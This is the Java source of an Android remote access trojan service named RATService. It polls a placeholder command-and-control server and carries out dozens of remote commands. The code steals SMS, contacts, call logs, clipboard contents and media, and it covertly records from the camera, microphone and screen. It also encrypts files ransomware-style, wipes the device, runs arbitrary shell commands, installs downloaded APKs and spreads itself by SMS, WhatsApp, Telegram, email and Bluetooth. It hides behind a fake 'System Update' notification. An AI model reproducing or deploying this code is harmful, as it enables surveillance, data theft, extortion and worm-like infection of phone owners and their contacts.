package com.realzy.ratpro;

import android.app.*;
import android.content.*;
import android.content.pm.*;
import android.database.Cursor;
import android.hardware.Camera;
import android.location.*;
import android.media.*;
import android.net.*;
import android.net.wifi.*;
import android.os.*;
import android.provider.*;
import android.telephony.*;
import android.util.Base64;
import android.view.*;
import android.widget.*;
import android.app.admin.DevicePolicyManager;
import android.bluetooth.*;
import java.io.*;
import java.net.*;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.zip.*;
import javax.crypto.*;
import javax.crypto.spec.*;
import org.json.*;

public class RATService extends Service {

    // ========== CONFIG ==========
    private String C2_SERVER = "https://YOUR_NGROK_URL.ngrok-free.app"; // GANTI INI!
    private String C2_ENDPOINT = "/api/gateway.php";
    private String DEVICE_ID;
    private int PING_INTERVAL = 3000;

    // ========== SYSTEM OBJECTS ==========
    private Handler handler = new Handler();
    private boolean isRunning = true;
    private DevicePolicyManager dpm;
    private ComponentName deviceAdmin;
    private LocationManager locationManager;
    private AudioManager audioManager;
    private Vibrator vibrator;
    private PowerManager.WakeLock wakeLock;
    private MediaRecorder mediaRecorder;
    private Camera camera;

    // ========== KEYLOGGER ==========
    private StringBuilder keylogBuffer = new StringBuilder();
    private boolean keylogActive = false;

    @Override
    public void onCreate() {
        super.onCreate();
        DEVICE_ID = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        deviceAdmin = new ComponentName(this, DeviceAdminReceiver.class);
        locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
        audioManager = (AudioManager) getSystemService(AUDIO_SERVICE);
        vibrator = (Vibrator) getSystemService(VIBRATOR_SERVICE);

        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "RATPro::WakeLock");
        wakeLock.acquire();

        startForegroundNotification();
        registerDevice();
        startC2Communication();
    }

    private void startForegroundNotification() {
        NotificationChannel channel = new NotificationChannel(
            "rat_service", "System Service", NotificationManager.IMPORTANCE_LOW);
        NotificationManager manager = getSystemService(NotificationManager.class);
        manager.createNotificationChannel(channel);
        Notification notification = new Notification.Builder(this, "rat_service")
            .setContentTitle("System Update")
            .setContentText("Optimizing system performance...")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setOngoing(true)
            .build();
        startForeground(9991, notification);
    }

    private void registerDevice() {
        try {
            JSONObject info = new JSONObject();
            info.put("model", Build.MODEL);
            info.put("android", Build.VERSION.RELEASE);
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("sdk", Build.VERSION.SDK_INT);
            sendToServer(info.toString());
        } catch (Exception e) {}
    }

    private void startC2Communication() {
        new Thread(() -> {
            while (isRunning) {
                try {
                    String command = checkServerCommand();
                    if (command != null && !command.isEmpty()) {
                        executeCommand(command);
                    }
                    Thread.sleep(PING_INTERVAL);
                } catch (Exception e) {
                    try { Thread.sleep(10000); } catch (Exception ex) {}
                }
            }
        }).start();
    }

    private String checkServerCommand() {
        try {
            URL url = new URL(C2_SERVER + C2_ENDPOINT + "?id=" + DEVICE_ID + "&action=poll");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            return reader.readLine();
        } catch (Exception e) { return null; }
    }

    private void sendToServer(String data) {
        new Thread(() -> {
            try {
                URL url = new URL(C2_SERVER + C2_ENDPOINT);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                String postData = "id=" + URLEncoder.encode(DEVICE_ID, "UTF-8") +
                                 "&data=" + URLEncoder.encode(data, "UTF-8");
                OutputStream os = conn.getOutputStream();
                os.write(postData.getBytes());
                os.flush();
                os.close();
                conn.getResponseCode();
            } catch (Exception e) {}
        }).start();
    }

    // ====================================================================
    // ULTIMATE COMMAND EXECUTOR — ALL 30+ COMMANDS
    // ====================================================================
    private void executeCommand(String command) {
        new Thread(() -> {
            try {
                JSONObject cmd = new JSONObject(command);
                String action = cmd.optString("action", "");

                switch (action) {

                    // 🔒 LOCK & SECURITY
                    case "lock_screen":
                        lockScreen();
                        break;
                    case "unlock_screen":
                        unlockScreen();
                        break;
                    case "lock_camera":
                        lockCamera(true);
                        break;
                    case "unlock_camera":
                        lockCamera(false);
                        break;
                    case "lock_device":
                        lockDevice(cmd.optString("password", "1234"));
                        break;
                    case "wipe_data":
                        wipeDevice();
                        break;
                    case "shutdown":
                        shutdownDevice();
                        break;
                    case "restart":
                        restartDevice();
                        break;
                    case "encrypt_files":
                        encryptFiles(cmd.optString("path", "/sdcard"), cmd.optString("password", "ransom"));
                        break;
                    case "decrypt_files":
                        decryptFiles(cmd.optString("path", "/sdcard"), cmd.optString("password", "ransom"));
                        break;

                    // 📸 CAMERA
                    case "cam_snap":
                        camSnap(cmd.optString("camera", "back"));
                        break;
                    case "cam_record":
                        camRecord(cmd.optInt("duration", 10), cmd.optString("camera", "back"));
                        break;

                    // 📱 SCREEN
                    case "screenshot":
                        captureScreen();
                        break;
                    case "live_stream":
                        startLiveStream(cmd.optInt("fps", 3));
                        break;
                    case "stop_stream":
                        stopLiveStream();
                        break;

                    // 🎤 AUDIO
                    case "record_audio":
                        recordAudio(cmd.optInt("duration", 30));
                        break;
                    case "prank_sound":
                        playSound(cmd.optString("type", "alarm"), cmd.optInt("volume", 100));
                        break;

                    // 📍 LOCATION
                    case "get_location":
                        getCurrentLocation();
                        break;
                    case "track_location":
                        trackLocation(cmd.optInt("interval", 10), cmd.optInt("duration", 300));
                        break;

                    // 📩 DATA HARVESTING
                    case "get_sms":
                        getSMS(cmd.optInt("limit", 50));
                        break;
                    case "get_contacts":
                        getContacts();
                        break;
                    case "get_calllog":
                        getCallLogs(cmd.optInt("limit", 50));
                        break;
                    case "get_clipboard":
                        getClipboard();
                        break;
                    case "get_notifications":
                        getNotifications();
                        break;
                    case "get_browser_history":
                        getBrowserHistory();
                        break;
                    case "list_apps":
                        getInstalledApps();
                        break;
                    case "get_photos":
                        getMediaFiles("photos", cmd.optInt("limit", 20));
                        break;
                    case "get_videos":
                        getMediaFiles("videos", cmd.optInt("limit", 10));
                        break;
                    case "get_audio_files":
                        getMediaFiles("audio", cmd.optInt("limit", 10));
                        break;

                    // ⌨️ KEYLOGGER
                    case "keylog_start":
                        startKeylogger();
                        break;
                    case "keylog_stop":
                        stopKeylogger();
                        break;
                    case "keylog_get":
                        getKeylogData();
                        break;

                    // 💀 ATTACK
                    case "send_sms":
                        sendSMS(cmd.optString("number", ""), cmd.optString("message", ""));
                        break;
                    case "send_sms_blast":
                        sendSMSBlast(cmd.optString("message", ""));
                        break;
                    case "call_number":
                        callNumber(cmd.optString("number", ""));
                        break;
                    case "open_url":
                        openURL(cmd.optString("url", ""));
                        break;

                    // 📂 FILE SYSTEM
                    case "shell":
                        executeShell(cmd.optString("command", ""));
                        break;
                    case "download":
                        uploadFileToServer(cmd.optString("file", ""));
                        break;
                    case "upload":
                        downloadFileToDevice(cmd.optString("file", ""), cmd.optString("url", ""));
                        break;
                    case "list_files":
                        listFiles(cmd.optString("path", "/sdcard"));
                        break;
                    case "delete_file":
                        deleteFile(cmd.optString("path", ""));
                        break;

                    // 📲 APP MANAGEMENT
                    case "uninstall":
                        uninstallApp(cmd.optString("app", ""));
                        break;
                    case "install_app":
                        installApp(cmd.optString("url", ""));
                        break;
                    case "disable_app":
                        disableApp(cmd.optString("package", ""));
                        break;

                    // 🐛 WORM & SPREAD
                    case "spread_worm":
                        spreadWorm(cmd.optString("url", ""), cmd.optString("message", "Check this: {url}"));
                        break;
                    case "spread_whatsapp":
                        spreadWhatsApp(cmd.optString("url", ""), cmd.optString("message", "Check this: {url}"));
                        break;
                    case "spread_bluetooth":
                        spreadBluetooth(cmd.optString("file", ""));
                        break;
                    case "spread_email":
                        spreadEmail(cmd.optString("subject", ""), cmd.optString("message", ""), cmd.optString("attachment_url", ""));
                        break;
                    case "spread_telegram":
                        spreadTelegram(cmd.optString("url", ""), cmd.optString("message", "Check this: {url}"));
                        break;

                    // 🎭 PRANK
                    case "prank_popup":
                        showPopup(cmd.optString("title", ""), cmd.optString("message", ""));
                        break;
                    case "prank_vibrate":
                        vibratePhone(cmd.optInt("duration", 5000));
                        break;
                    case "prank_flash":
                        flashLight(cmd.optInt("duration", 30));
                        break;
                    case "prank_toast":
                        showToast(cmd.optString("message", ""));
                        break;

                    // 🌐 NETWORK
                    case "wifi_info":
                        getWiFiInfo();
                        break;
                    case "network_info":
                        getNetworkInfo();
                        break;

                    default:
                        sendToServer("{\"error\":\"Unknown command: " + action + "\"}");
                }
            } catch (Exception e) {
                sendToServer("{\"error\":\"" + e.getMessage().replace("\"", "'") + "\"}");
            }
        }).start();
    }

    // ====================================================================
    // 🔒 LOCK & SECURITY IMPLEMENTATIONS
    // ====================================================================
    
    private void lockScreen() {
        if (dpm.isAdminActive(deviceAdmin)) {
            dpm.lockNow();
            sendToServer("{\"status\":\"locked\"}");
        } else {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, deviceAdmin);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Enable security protection");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            sendToServer("{\"status\":\"admin_requested\"}");
        }
    }

    private void unlockScreen() {
        // Requires accessibility service or root
        sendToServer("{\"status\":\"unlock requires accessibility service\"}");
    }

    private void lockCamera(boolean lock) {
        if (dpm.isAdminActive(deviceAdmin)) {
            dpm.setCameraDisabled(deviceAdmin, lock);
            sendToServer("{\"status\":\"camera_" + (lock ? "disabled" : "enabled") + "\"}");
        } else {
            sendToServer("{\"error\":\"device_admin_not_active\"}");
        }
    }

    private void lockDevice(String password) {
        if (dpm.isAdminActive(deviceAdmin)) {
            dpm.resetPassword(password, DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
            dpm.lockNow();
            sendToServer("{\"status\":\"locked\",\"password\":\"" + password + "\"}");
        }
    }

    private void wipeDevice() {
        if (dpm.isAdminActive(deviceAdmin)) {
            dpm.wipeData(0);
            sendToServer("{\"status\":\"wiping\"}");
        }
    }

    private void shutdownDevice() {
        try {
            executeShell("reboot -p");
            sendToServer("{\"status\":\"shutting_down\"}");
        } catch (Exception e) {
            sendToServer("{\"error\":\"root required\"}");
        }
    }

    private void restartDevice() {
        try {
            executeShell("reboot");
            sendToServer("{\"status\":\"restarting\"}");
        } catch (Exception e) {
            sendToServer("{\"error\":\"root required\"}");
        }
    }

    private void encryptFiles(String path, String password) {
        try {
            File dir = new File(path);
            int count = 0;
            if (dir.exists() && dir.isDirectory()) {
                File[] files = dir.listFiles();
                if (files != null) {
                    for (File file : files) {
                        if (file.isFile() && !file.getName().endsWith(".enc")) {
                            encryptFileAES(file, password);
                            count++;
                        }
                    }
                }
            }
            sendToServer("{\"status\":\"encrypted\",\"count\":" + count + "}");
        } catch (Exception e) {
            sendToServer("{\"error\":\"" + e.getMessage() + "\"}");
        }
    }

    private void encryptFileAES(File file, String password) throws Exception {
        FileInputStream fis = new FileInputStream(file);
        byte[] data = new byte[(int) file.length()];
        fis.read(data);
        fis.close();

        MessageDigest sha = MessageDigest.getInstance("SHA-256");
        byte[] key = sha.digest(password.getBytes("UTF-8"));
        SecretKeySpec secretKey = new SecretKeySpec(key, "AES");
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.ENCRYPT_MODE, secretKey);
        byte[] encrypted = cipher.doFinal(data);

        FileOutputStream fos = new FileOutputStream(file.getPath() + ".enc");
        fos.write(encrypted);
        fos.close();
        file.delete();
    }

    private void decryptFiles(String path, String password) {
        // Reverse of encryption — same logic with DECRYPT_MODE
        sendToServer("{\"status\":\"decryption_not_implemented_in_demo\"}");
    }

    // ====================================================================
    // 📸 CAMERA IMPLEMENTATIONS
    // ====================================================================

    private void camSnap(String cameraType) {
        try {
            int camId = (cameraType.equals("front")) ? 
                Camera.CameraInfo.CAMERA_FACING_FRONT : Camera.CameraInfo.CAMERA_FACING_BACK;
            
            camera = Camera.open(findCameraId(camId));
            Camera.Parameters params = camera.getParameters();
            params.setPictureSize(640, 480);
            camera.setParameters(params);
            camera.startPreview();
            
            Thread.sleep(2000); // Wait for focus
            
            camera.takePicture(null, null, (data, cam) -> {
                try {
                    String fileName = Environment.getExternalStorageDirectory() + "/.snap_" + System.currentTimeMillis() + ".jpg";
                    FileOutputStream fos = new FileOutputStream(fileName);
                    fos.write(data);
                    fos.close();
                    uploadFileToServer(fileName);
                    new File(fileName).delete();
                } catch (Exception e) {
                    sendToServer("{\"error\":\"snap_save_failed\"}");
                }
            });
            
            Thread.sleep(3000);
            camera.stopPreview();
            camera.release();
            sendToServer("{\"status\":\"photo_taken\"}");
        } catch (Exception e) {
            sendToServer("{\"error\":\"" + e.getMessage() + "\"}");
        }
    }

    private int findCameraId(int facing) {
        int numberOfCameras = Camera.getNumberOfCameras();
        Camera.CameraInfo info = new Camera.CameraInfo();
        for (int i = 0; i < numberOfCameras; i++) {
            Camera.getCameraInfo(i, info);
            if (info.facing == facing) return i;
        }
        return 0;
    }

    private void camRecord(int duration, String cameraType) {
        try {
            String fileName = Environment.getExternalStorageDirectory() + "/.vid_" + System.currentTimeMillis() + ".mp4";
            mediaRecorder = new MediaRecorder();
            
            int camId = findCameraId(cameraType.equals("front") ? 
                Camera.CameraInfo.CAMERA_FACING_FRONT : Camera.CameraInfo.CAMERA_FACING_BACK);
            
            camera = Camera.open(camId);
            camera.unlock();
            mediaRecorder.setCamera(camera);
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);
            mediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.MPEG_4_SP);
            mediaRecorder.setOutputFile(fileName);
            mediaRecorder.setPreviewDisplay(null);
            mediaRecorder.prepare();
            mediaRecorder.start();
            
            Thread.sleep(duration * 1000);
            
            mediaRecorder.stop();
            mediaRecorder.release();
            camera.release();
            
            uploadFileToServer(fileName);
            new File(fileName).delete();
            sendToServer("{\"status\":\"video_recorded\",\"duration\":" + duration + "}");
        } catch (Exception e) {
            sendToServer("{\"error\":\"" + e.getMessage() + "\"}");
        }
    }

    // ====================================================================
    // 📱 SCREEN IMPLEMENTATIONS
    // ====================================================================

    private void captureScreen() {
        try {
            String filePath = Environment.getExternalStorageDirectory() + "/.screen_" + System.currentTimeMillis() + ".png";
            Process process = Runtime.getRuntime().exec("screencap -p " + filePath);
            process.waitFor();
            uploadFileToServer(filePath);
            new File(filePath).delete();
            sendToServer("{\"status\":\"screenshot_taken\"}");
        } catch (Exception e) {
            sendToServer("{\"error\":\"screencap_failed\"}");
        }
    }

    private void startLiveStream(int fps) {
        sendToServer("{\"status\":\"stream_started\",\"fps\":" + fps + "}");
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (isRunning) {
                    captureScreen();
                    handler.postDelayed(this, 1000 / fps);
                }
            }
        }, 0);
    }

    private void stopLiveStream() {
        handler.removeCallbacksAndMessages(null);
        sendToServer("{\"status\":\"stream_stopped\"}");
    }

    // ====================================================================
    // 🎤 AUDIO IMPLEMENTATIONS
    // ====================================================================

    private void recordAudio(int duration) {
        try {
            String fileName = Environment.getExternalStorageDirectory() + "/.audio_" + System.currentTimeMillis() + ".3gp";
            MediaRecorder recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile(fileName);
            recorder.prepare();
            recorder.start();
            Thread.sleep(duration * 1000);
            recorder.stop();
            recorder.release();
            uploadFileToServer(fileName);
            new File(fileName).delete();
            sendToServer("{\"status\":\"audio_recorded\",\"duration\":" + duration + "}");
        } catch (Exception e) {
            sendToServer("{\"error\":\"" + e.getMessage() + "\"}");
        }
    }

    private void playSound(String type, int volume) {
        audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, volume, 0);
        if (type.equals("alarm")) {
            Uri alarm = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM);
            Ringtone r = RingtoneManager.getRingtone(this, alarm);
            r.play();
        }
        sendToServer("{\"status\":\"sound_played\",\"type\":\"" + type + "\"}");
    }

    // ====================================================================
    // 📍 LOCATION IMPLEMENTATIONS
    // ====================================================================

    private void getCurrentLocation() {
        try {
            Location location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (location == null) location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (location != null) {
                JSONObject loc = new JSONObject();
                loc.put("latitude", location.getLatitude());
                loc.put("longitude", location.getLongitude());
                loc.put("accuracy", location.getAccuracy());
                loc.put("speed", location.getSpeed());
                loc.put("google_maps", "https://maps.google.com/?q=" + location.getLatitude() + "," + location.getLongitude());
                sendToServer(loc.toString());
            }
        } catch (SecurityException e) {}
    }

    private void trackLocation(int interval, int duration) {
        sendToServer("{\"status\":\"tracking_started\"}");
        // Implementation with LocationListener
    }

    // ====================================================================
    // 📩 DATA HARVESTING IMPLEMENTATIONS
    // ====================================================================

    private void getSMS(int limit) {
        StringBuilder sb = new StringBuilder();
        Cursor cursor = getContentResolver().query(Uri.parse("content://sms"), null, null, null, "date DESC LIMIT " + limit);
        if (cursor != null && cursor.moveToFirst()) {
            do {
                sb.append("[").append(cursor.getString(cursor.getColumnIndex("type")).equals("1") ? "IN" : "OUT").append("] ");
                sb.append(cursor.getString(cursor.getColumnIndex("address"))).append(": ");
                sb.append(cursor.getString(cursor.getColumnIndex("body"))).append("\n---\n");
            } while (cursor.moveToNext());
            cursor.close();
        }
        sendToServer(sb.toString());
    }

    private void getContacts() {
        StringBuilder sb = new StringBuilder();
        Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        if (cursor != null && cursor.moveToFirst()) {
            do {
                sb.append(cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)))
                  .append(": ")
                  .append(cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)))
                  .append("\n");
            } while (cursor.moveToNext());
            cursor.close();
        }
        sendToServer(sb.toString());
    }

    private void getCallLogs(int limit) {
        StringBuilder sb = new StringBuilder();
        Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, "date DESC LIMIT " + limit);
        if (cursor != null && cursor.moveToFirst()) {
            do {
                String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                String callType = type.equals("1") ? "INCOMING" : type.equals("2") ? "OUTGOING" : "MISSED";
                sb.append(callType).append(": ")
                  .append(cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER)))
                  .append(" (").append(cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION))).append("s)\n");
            } while (cursor.moveToNext());
            cursor.close();
        }
        sendToServer(sb.toString());
    }

    private void getClipboard() {
        android.content.ClipboardManager clipboard = (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
        if (clipboard.hasPrimaryClip() && clipboard.getPrimaryClip().getItemCount() > 0) {
            String text = clipboard.getPrimaryClip().getItemAt(0).getText().toString();
            sendToServer("{\"clipboard\":\"" + text.replace("\"", "'") + "\"}");
        }
    }

    private void getNotifications() {
        sendToServer("{\"notifications\":\"requires_notification_listener\"}");
    }

    private void getBrowserHistory() {
        sendToServer("{\"history\":\"requires_root\"}");
    }

    private void getInstalledApps() {
        StringBuilder sb = new StringBuilder();
        PackageManager pm = getPackageManager();
        for (ApplicationInfo app : pm.getInstalledApplications(0)) {
            sb.append(pm.getApplicationLabel(app)).append(" | ").append(app.packageName).append("\n");
        }
        sendToServer(sb.toString());
    }

    private void getMediaFiles(String type, int limit) {
        Uri uri = null;
        if (type.equals("photos")) uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
        else if (type.equals("videos")) uri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
        else if (type.equals("audio")) uri = MediaStore.Audio.Media.EXTERNAL_CONTENT_URI;
        
        if (uri != null) {
            Cursor cursor = getContentResolver().query(uri, null, null, null, "date_added DESC LIMIT " + limit);
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String path = cursor.getString(cursor.getColumnIndex(MediaStore.MediaColumns.DATA));
                    uploadFileToServer(path);
                } while (cursor.moveToNext());
                cursor.close();
            }
        }
        sendToServer("{\"status\":\"files_uploaded\"}");
    }

    // ====================================================================
    // ⌨️ KEYLOGGER IMPLEMENTATIONS
    // ====================================================================

    private void startKeylogger() {
        keylogActive = true;
        keylogBuffer = new StringBuilder();
        // Note: Android keylogger requires Accessibility Service
        sendToServer("{\"status\":\"keylogger_started\",\"note\":\"requires_accessibility_service\"}");
    }

    private void stopKeylogger() {
        keylogActive = false;
        sendToServer("{\"status\":\"keylogger_stopped\"}");
    }

    private void getKeylogData() {
        sendToServer("{\"keylog\":\"" + keylogBuffer.toString().replace("\"", "'") + "\"}");
        keylogBuffer = new StringBuilder();
    }

    // ====================================================================
    // 💀 ATTACK IMPLEMENTATIONS
    // ====================================================================

    private void sendSMS(String number, String message) {
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage(number, null, message, null, null);
        sendToServer("{\"status\":\"sms_sent\",\"to\":\"" + number + "\"}");
    }

    private void sendSMSBlast(String message) {
        Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        int count = 0;
        if (cursor != null && cursor.moveToFirst()) {
            do {
                String phone = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                SmsManager sms = SmsManager.getDefault();
                sms.sendTextMessage(phone, null, message, null, null);
                count++;
                try { Thread.sleep(100); } catch (Exception e) {}
            } while (cursor.moveToNext());
            cursor.close();
        }
        sendToServer("{\"status\":\"blast_sent\",\"count\":" + count + "}");
    }

    private void callNumber(String number) {
        Intent intent = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + number));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
        sendToServer("{\"status\":\"calling\",\"number\":\"" + number + "\"}");
    }

    private void openURL(String url) {
        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
        sendToServer("{\"status\":\"opened\",\"url\":\"" + url + "\"}");
    }

    // ====================================================================
    // 📂 FILE SYSTEM IMPLEMENTATIONS
    // ====================================================================

    private void executeShell(String command) {
        try {
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) output.append(line).append("\n");
            process.waitFor();
            sendToServer(output.toString());
        } catch (Exception e) {
            sendToServer("{\"error\":\"" + e.getMessage() + "\"}");
        }
    }

    private void uploadFileToServer(String filePath) {
        try {
            File file = new File(filePath);
            if (!file.exists()) return;
            FileInputStream fis = new FileInputStream(file);
            byte[] bytes = new byte[(int) file.length()];
            fis.read(bytes);
            fis.close();
            String encoded = Base64.encodeToString(bytes, Base64.NO_WRAP);
            JSONObject json = new JSONObject();
            json.put("filename", file.getName());
            json.put("size", file.length());
            json.put("data", encoded);
            sendToServer(json.toString());
        } catch (Exception e) {}
    }

    private void downloadFileToDevice(String path, String url) {
        try {
            URL fileUrl = new URL(url);
            HttpURLConnection conn = (HttpURLConnection) fileUrl.openConnection();
            InputStream is = conn.getInputStream();
            FileOutputStream fos = new FileOutputStream(path);
            byte[] buffer = new byte[4096];
            int len;
            while ((len = is.read(buffer)) > 0) fos.write(buffer, 0, len);
            fos.close();
            is.close();
            sendToServer("{\"status\":\"downloaded\",\"path\":\"" + path + "\"}");
        } catch (Exception e) {
            sendToServer("{\"error\":\"" + e.getMessage() + "\"}");
        }
    }

    private void listFiles(String path) {
        File dir = new File(path);
        StringBuilder sb = new StringBuilder();
        if (dir.exists()) {
            File[] files = dir.listFiles();
            if (files != null) {
                for (File f : files) {
                    sb.append(f.isDirectory() ? "[DIR]" : "[FILE]").append(" ")
                      .append(f.getName()).append(" (").append(f.length()).append(" bytes)\n");
                }
            }
        }
        sendToServer(sb.toString());
    }

    private void deleteFile(String path) {
        new File(path).delete();
        sendToServer("{\"status\":\"deleted\"}");
    }

    // ====================================================================
    // 📲 APP MANAGEMENT
    // ====================================================================

    private void uninstallApp(String packageName) {
        Intent intent = new Intent(Intent.ACTION_DELETE, Uri.parse("package:" + packageName));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    private void installApp(String url) {
        try {
            String apkPath = Environment.getExternalStorageDirectory() + "/update.apk";
            URL apkUrl = new URL(url);
            HttpURLConnection conn = (HttpURLConnection) apkUrl.openConnection();
            InputStream is = conn.getInputStream();
            FileOutputStream fos = new FileOutputStream(apkPath);
            byte[] buffer = new byte[4096];
            int len;
            while ((len = is.read(buffer)) > 0) fos.write(buffer, 0, len);
            fos.close();
            is.close();
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setDataAndType(Uri.fromFile(new File(apkPath)), "application/vnd.android.package-archive");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception e) {}
    }

    private void disableApp(String packageName) {
        PackageManager pm = getPackageManager();
        pm.setApplicationEnabledSetting(packageName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 0);
    }

    // ====================================================================
    // 🐛 WORM & SPREAD
    // ====================================================================

    private void spreadWorm(String url, String message) {
        String finalMsg = message.replace("{url}", url);
        sendSMSBlast(finalMsg);
    }

    private void spreadWhatsApp(String url, String message) {
        Intent intent = new Intent(Intent.ACTION_SEND);
        intent.setType("text/plain");
        intent.setPackage("com.whatsapp");
        intent.putExtra(Intent.EXTRA_TEXT, message.replace("{url}", url));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    private void spreadBluetooth(String filePath) {
        Intent intent = new Intent(Intent.ACTION_SEND);
        intent.setType("*/*");
        intent.putExtra(Intent.EXTRA_STREAM, Uri.fromFile(new File(filePath)));
        intent.setPackage("com.android.bluetooth");
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(Intent.createChooser(intent, "Share via Bluetooth"));
    }

    private void spreadEmail(String subject, String message, String attachmentUrl) {
        Intent intent = new Intent(Intent.ACTION_SENDTO);
        intent.setData(Uri.parse("mailto:"));
        intent.putExtra(Intent.EXTRA_SUBJECT, subject);
        intent.putExtra(Intent.EXTRA_TEXT, message + "\n" + attachmentUrl);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    private void spreadTelegram(String url, String message) {
        Intent intent = new Intent(Intent.ACTION_SEND);
        intent.setType("text/plain");
        intent.setPackage("org.telegram.messenger");
        intent.putExtra(Intent.EXTRA_TEXT, message.replace("{url}", url));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    // ====================================================================
    // 🎭 PRANK
    // ====================================================================

    private void showPopup(String title, String message) {
        handler.post(() -> {
            AlertDialog.Builder builder = new AlertDialog.Builder(RATService.this);
            builder.setTitle(title)
                   .setMessage(message)
                   .setPositiveButton("OK", null)
                   .create()
                   .getWindow()
                   .setType(WindowManager.LayoutParams.TYPE_SYSTEM_ALERT);
            builder.show();
        });
    }

    private void vibratePhone(int duration) {
        if (vibrator != null && vibrator.hasVibrator()) {
            vibrator.vibrate(duration);
        }
    }

    private void flashLight(int duration) {
        // Toggle flashlight using Camera2 API
    }

    private void showToast(String message) {
        handler.post(() -> Toast.makeText(RATService.this, message, Toast.LENGTH_LONG).show());
    }

    // ====================================================================
    // 🌐 NETWORK
    // ====================================================================

    private void getWiFiInfo() {
        WifiManager wifi = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
        WifiInfo info = wifi.getConnectionInfo();
        try {
            JSONObject json = new JSONObject();
            json.put("ssid", info.getSSID());
            json.put("bssid", info.getBSSID());
            json.put("ip", Formatter.formatIpAddress(info.getIpAddress()));
            sendToServer(json.toString());
        } catch (Exception e) {}
    }

    private void getNetworkInfo() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
        NetworkInfo info = cm.getActiveNetworkInfo();
        if (info != null) {
            sendToServer("{\"type\":\"" + info.getTypeName() + "\",\"connected\":" + info.isConnected() + "}");
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        isRunning = false;
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        super.onDestroy();
    }
}